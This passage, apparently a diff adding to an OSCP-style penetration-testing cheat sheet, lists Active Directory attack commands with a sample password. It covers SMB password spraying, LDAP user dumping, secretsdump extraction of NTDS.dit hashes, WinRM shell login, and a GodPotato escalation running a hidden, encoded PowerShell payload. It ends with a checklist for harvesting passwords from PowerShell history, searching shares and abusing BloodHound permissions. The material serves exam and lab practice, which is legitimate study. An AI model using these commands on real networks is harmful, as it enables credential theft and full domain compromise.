+  `nxc smb 192.168.100.0/24 -u users.txt -p 'P@ssw0rd123$' --continue-on-success` `[OSCPB]`
+- **Local-Auth Spray** - **Do this:** If domain auth fails, try local-auth bypass:
+  `nxc smb 192.168.100.20 -u users.txt -p 'P@ssw0rd123$' --local-auth` `[OSCPC]`
+- **LDAP Search** - **Do this:** Quickly dump all users from LDAP:
+  `nxc ldap 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' --users`
+- **Secretsdump** - **Do this:** Dump NTDS.dit hashes from DC:
+  `impacket-secretsdump corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
+- **WinRM Shell** - **Do this:** Log in via WinRM:
+  `evil-winrm -i 192.168.100.20 -u john.doe -p 'P@ssw0rd123$'`
+- **RevShell Trigger (System)** - **Do this:** Trigger a System shell via GodPotato:
+  `.\GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."`
+
+---
+
+## 🆘 STILL STUCK? (The Triad of Despair)
+If you haven't moved in 30 minutes, check these EXACTLY:
+
+1.  **Ghost Web Apps**: `netstat -ano` (Windows) or `ss -lntp` (Linux). Is there a Port 8000/8080 only accessible locally? **Pivot via Chisel.**
+2.  **Forgotten History**: `type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Did an admin type a password in a command?
+3.  **Hidden Documents**: Search every SMB share for `.sql`, `.docx`, `.xml`, `.txt`, `.pdf`. Check `C:\windows.old` if it exists.
+4.  **BloodHound Logic**: Every `GenericWrite` or `WriteOwner` is a password reset or SPN hijack waiting to happen. Use `bloodyAD`.
+5.  **Clock Skew**: If Kerberos fails, always run `ntpdate 192.168.100.10` or check your Kali time.
